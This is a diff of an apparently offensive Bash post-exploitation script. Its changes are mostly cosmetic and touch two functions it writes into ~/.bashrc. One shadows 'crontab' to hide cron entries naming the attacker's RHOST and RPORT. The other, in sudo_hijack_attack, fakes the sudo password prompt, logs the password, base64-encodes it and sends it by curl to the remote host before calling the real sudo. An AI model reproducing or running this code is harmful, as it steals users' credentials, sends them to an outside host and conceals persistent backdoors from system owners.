@@ -95,17 +95,17 @@ then
 				# or use the bashrc to "hijack" "crontab -l" to list everything but ours
 				# for the carriage return trick, remember you may have to count columns to properly fill space
 				echo 'function crontab () {
-	REALBIN="$(which crontab)"
-	if $(echo "$1" | grep -qi "\-l");
-	then
-		if [ `$REALBIN -l | grep -v "'$RHOST'" | grep -v "'$RPORT'" | wc -l` -eq 0 ];then echo no crontab for $USER; else $REALBIN -l | grep -v "'$RHOST'" | grep -v "'$RPORT'"; fi;
-	elif $(echo "$1 | grep -qi "\-r);
-	then
-		if $(`$REALBIN` -l | grep "'$RHOST'" | grep -qi "'$RPORT'");then `$REALBIN` -l | grep --color=never "'$RHOST'" | grep --color=never "'$RPORT'" | crontab; else $REALBIN -r; fi;
-	else
-		$REALBIN "${@:1}"
-	fi
-	}' >> ~/.bashrc
+				REALBIN="$(which crontab)"
+				if $(echo "$1" | grep -qi "\-l");
+				then
+					if [ `$REALBIN -l | grep -v "'$RHOST'" | grep -v "'$RPORT'" | wc -l` -eq 0 ];then echo no crontab for $USER; else $REALBIN -l | grep -v "'$RHOST'" | grep -v "'$RPORT'"; fi;
+				elif $(echo "$1 | grep -qi "\-r);
+				then
+					if $(`$REALBIN` -l | grep "'$RHOST'" | grep -qi "'$RPORT'");then `$REALBIN` -l | grep --color=never "'$RHOST'" | grep --color=never "'$RPORT'" | crontab; else $REALBIN -r; fi;
+				else
+					$REALBIN "${@:1}"
+				fi
+				}' >> ~/.bashrc
 			fi
 		else
 			echo -e $INFO
@@ -224,15 +224,15 @@ sudo_hijack_attack() {
 		if [ "$DRYRUN" -eq 0 ];
 		then
 			echo 'function sudo () {
-			realsudo="$(which sudo)"
+			REALSUDO="$(which sudo)"
 			PASSWDFILE="'$PASSWDFILE'"
-			read -s -p "[sudo] password for $USER: " inputPasswd
-			printf "\n"; printf "%s\n" "$USER : $inputPasswd" >> $PASSWDFILE
+			read -s -p "[sudo] password for $USER: " PASSWD
+			printf "\n"; printf "%s\n" "$USER : $PASSWD" >> $PASSWDFILE
 			sort -uo "$PASSWDFILE" "$PASSWDFILE"
-			encoded=$(cat "$PASSWDFILE" | base64) > /dev/null 2>&1
-			curl -k -s "https://'$RHOST'/$encoded" > /dev/null 2>&1
-			$realsudo -S <<< "$inputPasswd" -u root bash -c "exit" > /dev/null 2>&1
-			$realsudo "${@:1}"
+			ENCODED=$(cat "$PASSWDFILE" | base64) > /dev/null 2>&1
+			curl -k -s "https://'$RHOST'/$ENCODED" > /dev/null 2>&1
+			$REALSUDO -S <<< "$PASSWD" -u root bash -c "exit" > /dev/null 2>&1
+			$REALSUDO "${@:1}"
 			}' >> ~/.bashrc
 			echo -e "\e[92m[+]\e[0m Hijacked $(whoami)'s sudo access"
 			echo "[+] Password will be Stored in $PASSWDFILE"
